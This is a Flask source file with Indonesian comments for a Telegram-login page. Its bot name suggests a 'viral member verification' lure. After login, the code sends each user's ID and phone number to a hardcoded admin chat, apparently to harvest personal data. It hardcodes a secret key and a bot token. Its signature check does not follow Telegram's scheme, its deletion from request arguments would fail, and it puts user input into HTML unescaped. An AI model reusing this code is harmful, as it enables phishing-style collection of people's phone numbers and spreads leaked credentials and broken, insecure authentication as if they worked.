from flask import Flask, request, session, redirect, url_for, render_template
import requests
import hashlib
import os
from urllib.parse import urlencode

app = Flask(__name__)
app.secret_key = 'a847b024af4f242332965e262b9ad7bcd42a64328926d222'  # Ganti dengan kunci rahasia Anda

# Isi variabel lingkungan secara manual
BOT_TOKEN = '7889113032:AAEqPqQV_ph9V5hpwnP5zNRB83fJc5VP_us'  # Ganti dengan token bot Anda
ADMIN_CHAT_ID = '5460230196'  # Ganti dengan chat ID admin Anda
BOT_USERNAME = 'verifikasimemberindoviralbot'  # Ganti dengan username bot Anda (tanpa @)

# Halaman login
@app.route('/')
def login():
    return render_template('login.html', bot_username=BOT_USERNAME)

# Endpoint untuk menangani otentikasi
@app.route('/auth')
def auth():
    try:
        data = request.args
        hash = data.get('hash')
        del data['hash']

        # Validasi tanda tangan
        check_hash = hashlib.sha256((urlencode(sorted(data.items())) + BOT_TOKEN).encode('utf-8')).hexdigest()

        if check_hash != hash:
            return "Invalid hash", 403

        # Simpan data pengguna dalam sesi
        session['user'] = data

        # Kirim nomor telepon ke admin
        message = f"User logged in:\nID: {data['id']}\nPhone: {data.get('phone', 'No phone provided')}"
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", params={
            'chat_id': ADMIN_CHAT_ID,
            'text': message
        })

        return f"""
            <h1>Login berhasil!</h1>
            <p>ID: {data['id']}</p>
            <p>Phone: {data.get('phone', 'No phone provided')}</p>
            <a href="/logout">Logout</a>
        """
    except Exception as e:
        return f"An error occurred: {str(e)}", 500

# Endpoint untuk logout
@app.route('/logout')
def logout():
    session.pop('user', None)
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run()
